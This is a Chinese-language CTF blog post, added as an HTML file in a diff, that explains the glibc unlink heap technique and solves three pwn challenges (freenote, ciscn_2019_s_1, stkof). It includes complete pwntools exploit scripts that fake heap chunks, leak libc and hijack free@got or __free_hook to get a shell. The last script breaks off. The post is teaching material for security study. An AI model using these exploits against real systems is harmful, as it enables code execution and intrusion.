@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8" /><title>PureWeb Blog</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepo/github.css"><link rel="stylesheet" href="/TestRepo/speciou.css"></head>
+<body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo/">Joe1sn&apos;s Blog</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepo/archives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<p><strong>2020-8-6 21:11</strong></p>
+<p>unlink原理</p>
+<!-- more -->
+<h1>unlink</h1>
+<blockquote>
+<p>其目的是把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。     --CTFWiki</p>
+</blockquote>
+<p><img src="https://wiki.x10sec.org/pwn/heap/figure/unlink_smallbin_intro.png" alt="原理" /></p>
+<blockquote>
+<p>我们在利用 unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>
+</blockquote>
+<p><strong>一个堆的结构如下</strong></p>
+<pre><code class="language-c">struct malloc_chunk {
+ 
+  INTERNAL_SIZE_T      mchunk_prev_size;
+  INTERNAL_SIZE_T      mchunk_size;
+ 
+  struct malloc_chunk* fd;
+  struct malloc_chunk* bk;
+ 
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+</code></pre>
+<p><strong>原来的过程是</strong></p>
+<p><a href="https://sbimg.cn/image/CurUm"><img src="https://wx1.sbimg.cn/2020/07/12/CurUm.png" alt="CurUm.png" /></a></p>
+<p>如果我们通过某种方式，对P-&gt;fd，P-&gt;bk进行修改，那么</p>
+<pre><code class="language-c">FD = P-&gt;fd = 目标地址-3 * byte
+BK = P-&gt;bk = 需要改写成的值
+
+{FD-&gt;bk=BK} = {目标地址-3 * byte + 3*byte = BK} = {目标地址 = P-&gt;bk = 需要改写成的值}
+{BK-&gt;fd=FD} = {需要改写成的值+2*byte = 目标地址-3 * byte = FD}//有被破坏的风险
+</code></pre>
+<p><strong>但是后来会有检查</strong></p>
+<pre><code class="language-c">//glibc-2.31/malloc/malloc.c line 1451
+static void unlink_chunk (mstate av, mchunkptr p)
+{
+    //1-检查size和下一个chunk的prev_size是否相等（不为新增）
+    //这个伪造的时候要注意
+  if (chunksize (p) != prev_size (next_chunk (p)))
+    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);
+
+  mchunkptr fd = p-&gt;fd;
+  mchunkptr bk = p-&gt;bk;
+    
+	//2-新增的检查，检查FD-&gt;bk和BK-&gt;fd是否为P，主要是绕过这个检查
+  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
+    malloc_printerr (&quot;corrupted double-linked list&quot;);
+    
+//unlink操作
+  fd-&gt;bk = bk;
+  bk-&gt;fd = fd;
+    
+.......
+.......
+</code></pre>
+<p><strong>绕过检查</strong></p>
+<p>在 unlink中</p>
+<pre><code class="language-c">P-&gt;fd=P-3*byte
+P-&gt;bk=P-2*byte
+
+FD=P-&gt;fd=P-3*byte
+BK=P-&gt;bk=P-2*byte
+</code></pre>
+<p>这样的话</p>
+<pre><code class="language-c">{FD-&gt;bk=P-3*byte+3*byte} = {FD-&gt;bk=P} == P
+{BK-&gt;fd=P-2*byte+2*byte} = {BK-&gt;fd=P} == P
+</code></pre>
+<p>绕过了检查，然后</p>
+<pre><code class="language-c">{FD-&gt;bk=BK} = {P=P-2*byte}
+{BK-&gt;fd=FD} = {P=P-3*byte}
+</code></pre>
+<p>那么最终<code>*P=P-3*byte</code>让P没有在heap里面，而是指向了Global_Pointer</p>
+<p>**输入&gt; **</p>
+<p>一个双向链表中，一个可以知道地址的chunk，可以伪造chunk</p>
+<p>**输出&gt; **</p>
+<p>和目前物理相邻的 free chunk 进行合并</p>
+<p><strong>题目的特点就是存在一个HeapAddressList的地址来存放申请的堆的地址</strong></p>
+<p>通过 <code>unsafe link</code>可以修改这个地址来达到泄露和修改的目的</p>
+<h1>e.g. 0ctf_2015_freenote</h1>
+<p><strong>检查保护</strong></p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p><strong>代码分析</strong></p>
+<ul>
+<li><strong>sub_400A49</strong></li>
+</ul>
+<p><img src="https://wx2.sbimg.cn/2020/07/13/CtJbn.png" alt="sub_400A49" /></p>
+<ul>
+<li><strong>sub_400D87</strong></li>
+</ul>
+<p>使用了<code>realloc</code>，<code>realloc</code>因为自带free，所以带有<code>unlink</code></p>
+<pre><code class="language-c">//glibc-2.23 malloc.c line:4299
+void*
+_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,
+	     INTERNAL_SIZE_T nb)
+{
+	........................
+    ........................
+    ........................
+      else if (next != av-&gt;top &amp;&amp;
+               !inuse (next) &amp;&amp;
+               (unsigned long) (newsize = oldsize + nextsize) &gt;=
+               (unsigned long) (nb))
+        {
+          newp = oldp;
+          unlink (av, next, bck, fwd);
+        }
+</code></pre>
+<ul>
+<li><strong>sub_400F7D</strong></li>
+</ul>
+<p>检查出chunk不存在，但还是能free掉，造成double free，并且原文不会被删除</p>
+<p><img src="https://wx1.sbimg.cn/2020/07/13/CttRI.png" alt="sub_400F7D" /></p>
+<ul>
+<li><strong>sub_400B14</strong></li>
+</ul>
+<p>既然原文不会被删除，那么就可以通过这个函数泄露libc_base和heap_addr（unsorted bin 链表）</p>
+<p><strong>思路</strong></p>
+<p>可以泄露heap地址+有管理的pointer=unlink技巧</p>
+<p><strong>泄露</strong></p>
+<p>直接用python脚本可能看起来清晰些</p>
+<ul>
+<li>1.申请三个chunk，最后一个防止和top_chunk合并</li>
+</ul>
+<pre><code class="language-python">	for i in range(3):
+		newnote(8,str(i)*8)
+
+	newnote(0x10,&quot;avoid enmerching&quot;)#3
+</code></pre>
+<ul>
+<li>2.删除第一个(idx=0)和相隔（防止合并）一个的chunk(idx=2)</li>
+</ul>
+<pre><code class="language-python">	deletenote(0)
+	deletenote(2)
+</code></pre>
+<p><img src="https://wx2.sbimg.cn/2020/07/13/Ct8VU.png" alt="leak" /></p>
+<p>这样通过两个chunk，分别泄露<code>libc base</code>和<code>Global Pointer</code>的地址</p>
+<ul>
+<li>3.unlink</li>
+</ul>
+<p>经过调试我们发现，Global_Pointer+0x18的地方才是idx=0的chunk，所以我们准备改写这里，同时free之前的所有chunk，让他们合并，最终让目标double free(realloc自带free)，然后unlink</p>
+<pre><code class="language-python">#unlink
+	deletenote(3)
+	deletenote(2)
+	deletenote(1)
+	deletenote(0) #all in top chunk
+    
+    fakechunk = p64(0)		#prev_size
+	fakechunk += p64(0x51)	#size
+	fakechunk += p64(Global_Pointer+0x30-0x18)	#fd
+	fakechunk += p64(Global_Pointer+0x30-0x10)	#bk
+	fakechunk += &quot;C&quot;*0x30	#filling
+	fakechunk += p64(0x50)	#nextchunk-&gt;prev_size
+	fakechunk += p64(0x20)	#nextchunk-&gt;size
+    newnote(len(fakechunk),fakechunk)#realloc using unlink(),changed value
+    
+#double free
+	payload = &quot;D&quot;*0x80
+	payload += p64(0x110) + p64(0x90)
+	payload += &quot;D&quot;*0x80 + p64(0)
+	payload += p64(0x71) + &quot;D&quot;*0x60
+	newnote(len(payload),payload)#causing double free
+</code></pre>
+<p><img src="https://wx1.sbimg.cn/2020/07/13/CtVX6.png" alt="overpass.png" /></p>
+<p>因为是按照Global_Pointer的记录来free，那么就会free蓝框的chunk(idx=2)</p>
+<pre><code class="language-assembly">   0x401064    mov    rax, qword ptr [rax]
+   0x401067    mov    rdi, rax
+ ► 0x40106a    call   free@plt &lt;0x4006b0&gt;
+        ptr: 0x1038950 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
+ 
+   0x40106f    mov    edi, 0x4012a3
+   0x401074    call   puts@plt &lt;0x4006c0&gt;
+</code></pre>
+<p>但是和第一个有什么关系呢？等我们free完后，再看看Global_Pointer</p>
+<p><img src="https://wx1.sbimg.cn/2020/07/13/Cw59N.png" alt="difference.png" /></p>
+<p>我们再仔细想想这个过程</p>
+<p>按照程序中的算法 <code>free(0x1038950)</code>，但是<code>0x1038950</code>的<code>prev_inuse</code>为<code>0</code>，那么free就会把这两个给合并，然后unlink</p>
+<p>此时合并后的chunk P中</p>
+<pre><code>P-&gt;fd=(Global_Pointer+0x30)-0x18
+P-&gt;bk=(Global_Pointer+0x30)-0x10
+</code></pre>
+<p>按照我们之前的分析，到了最后</p>
+<pre><code>{P=&amp;P-0x18} = {P = Global_Pointer +0x18}
+</code></pre>
+<p><strong>攻击</strong></p>
+<p>这个时候我们试着编辑</p>
+<pre><code class="language-python">editnote(0,0x60,p64(8)+p64(1)+p64(8)+p64(elf.got[&quot;free&quot;])+&quot;A&quot;*0x40)
+</code></pre>
+<p>按照程序的算法，我们要编辑的是</p>
+<pre><code class="language-c">*(qword_6020A8 + 24LL * v3 + 32)//v3=idx
+</code></pre>
+<p>qword_6020A8 = Global_Pointer =  0x1037000</p>
+<p>那么我们对idx=0编辑的是 0x1037000+0x20=0x1037020</p>
+<p><img src="https://i.loli.net/2020/07/13/jEhn1zQm3yTUtRS.png" alt="changed.png" /></p>
+<p>发现写入成功，这样的话，<code>*(qword_6020A8 + 24LL * 0 + 32) = free@got</code>，再改写为<code>_libc_system</code>就行了</p>
+<p><strong>完整EXP</strong></p>
+<pre><code class="language-python">from pwn import *
+elf = ELF(&quot;freenote_x64&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+sh = 0
+
+def listnote():
+	sh.sendlineafter(&quot;Your choice: &quot;,&quot;1&quot;)
+
+def newnote(size,text):
+	sh.sendlineafter(&quot;Your choice: &quot;,&quot;2&quot;)
+	sh.sendlineafter(&quot;Length of new note: &quot;,str(size))
+	sh.sendafter(&quot;Enter your note: &quot;,text)
+
+def editnote(idx,sz,text):
+	sh.sendlineafter(&quot;Your choice: &quot;,&quot;3&quot;)
+	sh.sendlineafter(&quot;Note number: &quot;,str(idx))
+	sh.sendlineafter(&quot;Length of note: &quot;,str(sz))
+	sh.sendafter(&quot;Enter your note: &quot;,text)
+
+def deletenote(idx):
+	sh.sendlineafter(&quot;Your choice: &quot;,&quot;4&quot;)
+	sh.sendlineafter(&quot;Note number: &quot;,str(idx))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(&quot;freenote_x64&quot;)
+	else:
+		sh = remote(ip,port)
+
+	for i in range(3):
+		newnote(8,str(i)*8)
+
+	newnote(0x10,&quot;avoid enmerching&quot;)#3
+
+	deletenote(0)
+	deletenote(2)
+
+	newnote(0x8,'A'*0x8)#0
+	newnote(0x8,&quot;B&quot;*0x8)#2
+
+	listnote()
+
+	sh.recvuntil(&quot;0. AAAAAAAA&quot;)
+	Global_Pointer = u64(sh.recv(4).ljust(8,&quot;\x00&quot;))-0x1940
+	sh.recvuntil(&quot;2. BBBBBBBB&quot;)
+	heap_base = u64(sh.recv(6).ljust(8,&quot;\x00&quot;))-0x3c4b78
+	info(&quot;Global Pointer  --&gt; &quot;+hex(Global_Pointer))
+	info(&quot;Libc Base  --&gt; &quot;+hex(heap_base))
+	info(&quot;System  --&gt;&quot;+hex(heap_base+libc.sym[&quot;system&quot;]))
+
+	deletenote(3)
+	deletenote(2)
+	deletenote(1)
+	deletenote(0) #all in top chunk
+	
+	gdb.attach(sh)
+	#unlink
+	fakechunk = p64(0)		#prev_size
+	fakechunk += p64(0x51)	#size
+	fakechunk += p64(Global_Pointer+0x30-0x18)	#fd
+	fakechunk += p64(Global_Pointer+0x30-0x10)	#bk
+	fakechunk += &quot;C&quot;*0x30	#filling
+	fakechunk += p64(0x50)	#nextchunk-&gt;prev_size
+	fakechunk += p64(0x20)	#nextchunk-&gt;size
+	newnote(len(fakechunk),fakechunk)#realloc using unlink(),changed value
+
+	payload = &quot;D&quot;*0x80
+	payload += p64(0x110) + p64(0x90)
+	payload += &quot;D&quot;*0x80 + p64(0)
+	payload += p64(0x71) + &quot;D&quot;*0x60
+	newnote(len(payload),payload)#causing double free
+	deletenote(2)
+
+	#gdb.attach(sh)
+	#attack
+	editnote(0,0x60,p64(8)+p64(1)+p64(8)+p64(elf.got[&quot;free&quot;])+&quot;A&quot;*0x40)
+	editnote(0,0x8,p64(heap_base+libc.sym[&quot;system&quot;]))
+
+	newnote(8,&quot;/bin/sh\x00&quot;)
+	deletenote(4)
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;25743&quot;,0,0)
+</code></pre>
+<h1>eg.ciscn_2019_s_1</h1>
+<p>一道感觉高度复杂的题</p>
+<h2>1.检查</h2>
+<p><img src="https://s1.ax1x.com/2020/08/06/a2jqgK.png" alt="checksec.png" /></p>
+<h2>2.反汇编</h2>
+<p>有四个功能</p>
+<pre><code class="language-c">unsigned __int64 menu()
+{
+  unsigned __int64 v0; // ST08_8
+
+  v0 = __readfsqword(0x28u);
+  puts(&quot;1.malloc&quot;);
+  puts(&quot;2.free&quot;);
+  puts(&quot;3.edit&quot;);
+  puts(&quot;4.show&quot;);
+  return __readfsqword(0x28u) ^ v0;
+}
+</code></pre>
+<h3>ma()</h3>
+<p><img src="https://s1.ax1x.com/2020/08/06/a6xcgU.png" alt="ma().png" /></p>
+<p>很平常的一个创建chunk的函数，其中</p>
+<p><strong>0x6020E0</strong> 记录了chunk的地址，<strong>0x602060</strong>记录了chunk的大小，最多可以有32个chunk</p>
+<h3>ed()</h3>
+<p><img src="https://s1.ax1x.com/2020/08/06/acSwYq.png" alt="ed().png" /></p>
+<p>有了一个新的固定地址：<strong>0x6022BC</strong></p>
+<h3>sh()</h3>
+<p><img src="https://s1.ax1x.com/2020/08/06/a6zsZd.png" alt="sh.png" /></p>
+<p>这里也记录下了一个新的地址：<strong>0x6022B8</strong></p>
+<h2>3.思路</h2>
+<h3>整理信息</h3>
+<p>几个固定地址从低到高如下</p>
+<p>| 地址         | 变量名 |
+| ------------ | ------ |
+| <strong>0x602060</strong> | len    |
+| <strong>0x6020E0</strong> | heap   |
+| <strong>0x6022B8</strong> | key2   |
+| <strong>0x6022BC</strong> | key1   |</p>
+<ul>
+<li>创建chunk的时候，返回了chunk的地址，heap有用做管理chunk地址的全局指针，具有 <strong>Unlink</strong> 漏洞的特征</li>
+<li>要getshell，就要修改程序的got表，那么就要进行信息泄露，但是 <strong>key2</strong> 锁住了对<code>sh()</code>的使用，那么就必须修改 <strong>key2</strong> 的值。发现 <strong>key1</strong> 的地址和 <strong>key2</strong> 的相近，就可以顺便修改 <strong>key1</strong>的值，从而可以多次使用<code>ed()</code></li>
+<li>经过远程测试可以发现，可以连续对同一chunk使用<code>fr</code>，那么环境因该是 <strong>libc-2.27</strong>即以上的环境，BUUOJ中明确给出了环境为 <strong>Ubuntu18</strong></li>
+</ul>
+<h3>攻击思路</h3>
+<p>这里有两种思路，具体看你对数据是否敏感</p>
+<ol>
+<li>
+<p>简单的是小伙伴<a href="http://www.cnitlrt.top/">cnitlrt</a>的思路，特殊点是发现bss端上(<a href="https://www.jianshu.com/u/1d5ea41bdd36">cnitlrt的简书</a>)</p>
+<p>如下</p>
+<pre><code class="language-assembly">.bss:0000000000602060 len_602060      dd 20h dup(?)           ; DATA XREF: ma+CA↑o
+.bss:0000000000602060                                         ; fr+AC↑o ...
+.bss:00000000006020E0                 public heap_6020E0
+.bss:00000000006020E0 ; void *heap_6020E0[32]
+.bss:00000000006020E0 heap_6020E0     dq 20h dup(?)           ; DATA XREF: ma+49↑o
+.bss:00000000006020E0                                         ; ma+B2↑o ...
+.bss:00000000006021E0                 public pro
+.bss:00000000006021E0 pro             db    ? ;
+.bss:00000000006021E1                 db    ? ;
+.bss:00000000006021E2                 db    ? ;
+.bss:00000000006021E3                 db    ? ;
+.....................                 ..    . .
+.bss:00000000006022B8                 public key2_6022B8
+.bss:00000000006022B8 key2_6022B8     dd ?                    ; DATA XREF: sh+17↑r
+.bss:00000000006022BC                 public key1_6022BC
+.bss:00000000006022BC key1_6022BC     dd ?                    ; DATA XREF: ed+17↑r
+.bss:00000000006022BC                                         ; ed+EC↑r ...
+.bss:00000000006022BC _bss            ends
+</code></pre>
+<p>在 <strong>heap_6020E0</strong>中，每个chunk占8字节，第32个就是 <strong>0x6020E0+8*32= 0x6021e0</strong>，刚好在 <strong>pro</strong> 段上面，而 <strong>pro</strong> 段距离 <strong>key1</strong> 相差 <strong>0xD8</strong>，如果通过 <strong>Unlink</strong> 到这里，直接 <code>ma</code>的时候向chunk中添加数据就可以直接覆写 <strong>key1</strong>和 <strong>key2</strong></p>
+<ul>
+<li><strong>1.</strong> 使用 <strong>Unlink</strong> 修改 <strong>key1</strong> 和 <strong>key2</strong></li>
+<li><strong>2.</strong> 泄露 <strong>free_hook</strong> 和 <strong>_libc_system</strong></li>
+<li><strong>3. Tcache_Dup</strong>后调用 <strong>free_hook</strong> 得到shell</li>
+</ul>
+</li>
+<li>
+<p>还有一种，来自于博客https://blog.csdn.net/qq_37433000/article/details/107026628</p>
+<p>这种方法非常复杂，但是不需要对数据太敏感，通过在libc-2.27中的 <strong>chunk_overlapping</strong> 来修改 <strong>key1</strong>和 <strong>key2</strong></p>
+</li>
+</ol>
+<p>这里先讲第一种</p>
+<h2>4.GDB</h2>
+<h3><strong>1.</strong> 使用 <strong>Unlink</strong> 修改 <strong>key1</strong> 和 <strong>key2</strong></h3>
+<ul>
+<li>
+<p>1.为了之后得到unsortedbin，这里我们需要布局，同时这里的heap[32]-&gt;size，决定了之后能覆盖的大小</p>
+<pre><code class="language-python">	#get unsorted bin
+	for i in xrange(7):
+		malloc(i,0xf8,str(i)*8)
+	malloc(7,0xf8,'7'*8)
+	malloc(32,0xf8,'20202020')
+	malloc(8,0xf8,'8'*8)
+	malloc(9,0xf8,&quot;/bin/sh\x00&quot;)
+</code></pre>
+</li>
+<li>
+<p>2.为了能够覆盖到 <strong>key1</strong>，这里就选最后一个chunk：heap[32]为要unlink的chunk</p>
+<pre><code class="language-python">	addr = 0x6020e0+8*32
+	payload = p64(0)+p64(0xf1)
+	payload += p64(addr-0x18)+p64(addr-0x10)
+	payload = payload.ljust(0xf0,&quot;\x00&quot;)
+	payload += p64(0xf0)
+</code></pre>
+</li>
+<li>
+<p>3.先填满tcache，要不然unlink不会是双链表</p>
+<pre><code class="language-python">	for i in xrange(7):
+		free(i+1)
+</code></pre>
+</li>
+<li>
+<p>4.Unlink攻击</p>
+<pre><code class="language-python">	edit(32,payload)
+	free(8)
+</code></pre>
+</li>
+</ul>
+<p><img src="https://s1.ax1x.com/2020/08/06/a27mqI.png" alt="unlink.png" /></p>
+<h3><strong>2.</strong> 泄露 <strong>free_hook</strong> 和 <strong>_libc_system</strong></h3>
+<ul>
+<li>
+<p>1.肯定要改写两个 <strong>key</strong> 的值</p>
+<pre><code class="language-python">	payload = p64(0x0000000000601fa0)
+	payload += p64(pro-0x18)+p64(pro-0x18)
+	payload += p64(pro)
+	payload = payload.ljust(0xf0,'\x00')
+	payload += p64(0x0000000a00000001)
+	edit(32,payload)
+</code></pre>
+<p>之前我们把<strong>heap[32]<strong>改成了 <strong>0x6021C8</strong>，那这次就是直接对</strong>0x6021C8</strong>编辑，反推算可以<strong>0x6021C8</strong>原本记录的是<strong>heap[29]</strong>，那这段payload就把**heap[32]**改成了 <strong>0x06021e0</strong>。同时该chunk距离 <strong>key</strong> 比较近，就可以改写</p>
+<p><img src="https://s1.ax1x.com/2020/08/06/a2XFit.png" alt="leak.png" /></p>
+</li>
+<li>
+<p>2.直接调用<code>sh</code></p>
+<p><img src="https://s1.ax1x.com/2020/08/06/a2XdoR.png" alt="leak-2.png" /></p>
+</li>
+</ul>
+<h3><strong>3. Tcache_Dup</strong>后调用 <strong>free_hook</strong> 得到shell</h3>
+<p>其实这个也不算啥攻击方式，就是我们控制了一个指针</p>
+<pre><code class="language-python">	edit(32,p64(free_hook))
+	edit(32,p64(system))
+	free(9)
+	sh.interactive()
+</code></pre>
+<p>其实从上面那步就可以看出来，每次对heap[32]进行编辑时，我们都可以修改他得值，从而由 heap[32] -&gt; free_hook，然后再次编辑就是在free_hook上面写了</p>
+<h2>5.exp</h2>
+<pre><code class="language-python">from pwn import *
+elf = ELF(&quot;ciscn_s_1&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+sh = 0
+
+def malloc(idx,sz,content):
+	sh.sendlineafter(&quot;4.show\n&quot;,&quot;1&quot;)
+	sh.sendlineafter(&quot;index:&quot;,str(idx))
+	sh.sendlineafter(&quot;size:&quot;,str(sz))
+	sh.recvuntil(&quot;gift: &quot;)
+	addr = u64(sh.recv(6).ljust(8,&quot;\x00&quot;))
+	sh.sendafter(&quot;content:&quot;,content)
+	return addr
+
+def free(idx):
+	sh.sendlineafter(&quot;4.show\n&quot;,&quot;2&quot;)
+	sh.sendlineafter(&quot;index:&quot;,str(idx))
+
+def edit(idx,content):
+	sh.sendlineafter(&quot;4.show\n&quot;,&quot;3&quot;)
+	sh.sendlineafter(&quot;index:&quot;,str(idx))
+	sh.sendafter(&quot;content:&quot;,content)
+
+def show(idx):
+	sh.sendlineafter(&quot;4.show\n&quot;,&quot;4&quot;)
+	sh.sendlineafter(&quot;index:&quot;,str(idx))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(&quot;ciscn_s_1&quot;)
+	else:
+		sh = remote(ip,port)
+
+	key1 = 0x06022BC
+	key2 = 0x06022B8
+	pro = 0x6021E0
+	#get unsorted bin
+	for i in xrange(7):
+		malloc(i,0xf8,str(i)*8)
+	malloc(7,0xf8,'7'*8)
+	malloc(32,0xf8,'20202020')
+	malloc(8,0xf8,'8'*8)
+	malloc(9,0xf8,&quot;/bin/sh\x00&quot;)
+
+	addr = 0x6020e0+8*32
+	payload = p64(0)+p64(0xf1)
+	payload += p64(addr-0x18)+p64(addr-0x10)
+	payload = payload.ljust(0xf0,&quot;\x00&quot;)
+	payload += p64(0xf0)
+	
+	for i in xrange(7):
+		free(i+1)
+	edit(32,payload)
+	free(8)
+
+	payload = p64(0x0000000000601fa0)
+	payload += p64(pro-0x18)+p64(pro-0x18)
+	payload += p64(pro)
+	payload = payload.ljust(0xf0,'\x00')
+	payload += p64(0x0000000a00000001)
+	edit(32,payload)
+	show(29)
+	libc_base = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-libc.sym[&quot;free&quot;]
+	free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+	system = libc_base + libc.sym[&quot;system&quot;]
+	success(&quot;libc base ==&gt; &quot;+hex(libc_base))
+	success(&quot;free_hook ==&gt; &quot;+hex(free_hook))
+	success(&quot;_libc_system ==&gt; &quot;+hex(system))
+
+	edit(32,p64(free_hook))
+	edit(32,p64(system))
+	free(9)
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(0,0,0,0)
+</code></pre>
+<h1>e.g. hitcon_2014 stkof</h1>
+<h2>1.checksec</h2>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<h2>2.IDA</h2>
+<p>程序太简陋了，几乎没有交互，能用的有三个功能</p>
+<pre><code class="language-python">def add(sz):
+	p.snedline(&quot;1&quot;)
+	p.snedline(str(sz))
+
+def edit(chunk,size,strs):
+    p.sendline(&quot;2&quot;)
+    p.sendline(chunk)    
+    p.sendline(size)
+    p.sendline(strs)
+
+def free(chunk):
+    p.sendline(&quot;3&quot;)
+    p.sendline(chunk)
+</code></pre>
+<p><strong>sub_4009E8() edit</strong></p>
+<pre><code class="language-c">for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) )
+  {
+    ptr += i;
+    n -= i;
+  }
+</code></pre>
+<blockquote>
+<p>没有控制输入范围，可以堆溢出</p>
+</blockquote>
+<p><strong>全局变量s</strong></p>
+<pre><code class="language-assembly">.bss:0000000000602104                 align 40h
+.bss:0000000000602140 ; char *s[1049600]
+.bss:0000000000602140 s               dq ?                    ; DATA XREF: add+78↑w
+.bss:0000000000602140                                         ; edit+60↑r ...
+.bss:0000000000602148                 db    ? ;
+.bss:0000000000602149                 db    ? ;
+.bss:000000000060214A                 db    ? ;
+</code></pre>
+<p><strong>思路</strong></p>
+<blockquote>
+<blockquote>
+<p>有堆溢出，有全局指针变量，没有输出函数，所以用unlink改<code>free@got</code> 为 <code>puts</code>，再次调用<code>free</code>就相当于调用<code>puts</code>，从而<code>libc leak</code></p>
+</blockquote>
+<blockquote>
+<p>填入<code>onegedget</code>或者该函数为<code>system</code>并执行binsh，从而getshell</p>
+</blockquote>
+</blockquote>
+<h2>3.GDB</h2>
+<p><strong>unlink部份</strong></p>
+<pre><code class="language-python">#unlink
+#code:
+    alloc(0x100)        # idx 1
+    alloc(0x30)         # idx 2
+    alloc(0x80)         # idx 3
+    
+    head = 0x602140  #全局变量
+    
+    #fake chunk
+    payload = p64(0)      
+    payload += p64(0x20) 
+    payload += p64(head + 16 - 0x18)  
+    payload += p64(head + 16 - 0x10) 
+    payload += p64(0x20)
+    payload = payload.ljust(0x30, 'a')
+    payload += p64(0x30)
+    payload += p64(0x90)
+    edit(2, len(payload), payload)
+	
+    #unlink
+    free(3)
+    p.recvuntil('OK\n')
+    gdb.attach(p)
+</code></pre>
+<p><strong>gdb</strong></p>
+<pre><code>0x1561000 PREV_INUSE {
+  prev_size = 0, 
+  size = 4113, 
+  fd = 0xa33, 
+  bk = 0x20, 
+  fd_nextsize = 0x602138, 
+  bk_nextsize = 0x602140
+}
+0x1562010 PREV_INUSE {
+  prev_size = 0, 
+  size = 273, 
+  fd = 0x0, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1562120 PREV_INUSE {
+  prev_size = 0, 
+  size = 1041, 
+  fd = 0xa4b4f, 
+  bk = 0x0, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+0x1562530 FASTBIN {
+  prev_size = 0, 
+  size = 65, 
+  fd = 0x0, 
+  bk = 0x20ac1, 
+  fd_nextsize = 0x602138, 
+  bk_nextsize = 0x602140
+}
+
+pwndbg&gt; x/32gx 0x1561000
+0x1561000:	0x0000000000000000	0x0000000000001011
+0x1561010:	0x0000000000000a33	0x0000000000000020
+			fake fd			    fake bk
+0x1561020:	0x0000000000602138	0x0000000000602140
+0x1561030:	0x0000000000000020	0x6161616161616161
+0x1561040:	0x0000000000000030	0x0000000000000090
+0x1561050:	0x0000000000000000	0x0000000000000000
+0x1561060:	0x0000000000000000	0x0000000000000000
+</code></pre>
+<h2>4.EXP</h2>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+elf = ELF(&quot;./stkof&quot;)
+libc = ELF('/home/joe1sn/libc/64/libc-2.23.so')
+#p = process(&quot;./stkof&quot;)
+p = remote(&quot;node3.buuoj.cn&quot;,&quot;25342&quot;)
+
+def alloc(size):
+    p.sendline('1')
+    p.sendline(str(size))
+    p.recvuntil('OK\n')
+
+def edit(idx, size, content):
+    p.sendline('2')
+    p.sendline(str(idx))
+    p.sendline(str(size))
+    p.send(content)
+    p.recvuntil('OK\n')
+
+def free(idx):
+    p.sendline('3')
+    p.sendline(str(idx))
+
+
+if __name__ == '__main__':
+
+    alloc(0x100)        # idx 1
+    alloc(0x30)         # idx 2
+    alloc(0x80)         # idx 3
+    
+    head = 0x602140		    #global pointer
+    payload = p64(0)        #prev_size
+    payload += p64(0x20)    #size --&gt; except the first line, the rest two line is equal to 0x20?
+    payload += p64(head + 16 - 0x18)   #fd
+    payload += p64(head + 16 - 0x10)   #bk
+    payload += p64(0x20)    # next chunk's prev_size bypass the check
+    payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size
+    
+    # make it believe that prev chunk is at global[2]
+    payload += p64(0x30)        #0x30 is the front one whole size?
+    
+    # make it believe that prev chunk is free
+    payload += p64(0x90)
+    edit(2, len(payload), payload)
+    
+    # unlink fake chunk, so global[2] =&amp;(global[2]) - 0x18 = head - 8
+    free(3)
+    p.recvuntil('OK\n')
+    #gdb.attach(p)
+    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
+    payload = 'a' * 8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
+    edit(2, len(payload), payload)
+    # edit free@got to puts@plt
+    payload = p64(elf.plt['puts'])
